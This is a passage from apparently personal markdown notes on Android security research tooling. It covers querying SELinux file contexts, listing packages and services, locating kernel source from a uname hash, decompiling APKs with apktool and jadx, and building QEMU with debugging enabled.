## the corresponding directory or file of a target is defined in the "file_contexts" file
## For example, "wm_trace_data_file" is in /system/etc/selinux/plat_file_contexts
cat /system/etc/selinux/plat_file_contexts | grep wm_trace
## output: /data/misc/wmtrace(/.*)?        u:object_r:wm_trace_data_file:s0
## other common directories:
##   - /vendor/etc/selinux/vendor_file_contexts
##   - /product/etc/selinux/product_file_contexts
```

Others

``` bash
# show all packages and the corresponding UIDs
pm list packages -U # these info also can be found in /data/system/packages.list

# show all IPC services
service list
```

### Kernel Source code

Get Git hash from `uname` output:

``` bash
akita:/ $ uname -a
Linux localhost 6.1.129-android14-11-g4cadbfbbe186-ab13408047 #1 SMP PREEMPT Fri Apr 25 02:03:44 UTC 2025 aarch64 Toybox
```

Locate the corresponding commit:

```
https://android.googlesource.com/kernel/common/+/4cadbfbbe186
```

Download the source archive:

```
https://android.googlesource.com/kernel/common/+archive/4cadbfbbe186.tar.gz
```

### Phone

Enable USB Debugging:
- Traditional Chinese: https://developer.android.com/studio/debug/dev-options?hl=zh-tw
- English: https://developer.android.com/studio/debug/dev-options

Device Information:
- deviceinfohw: https://www.deviceinfohw.ru/devices/uploads.php?platform=PLATFORM&cpu=CPU&brand=BRAND&filter_key=KEY&filter=&submit=

### apk

``` bash
# extract apk
apktool d XXXXX.apk -o out

# view code
jadx-gui XXXXX.apk
```

## QEMU

### Compilation

``` bash
mkdir build
cd build
../configure --enable-debug
make -j`nproc`
```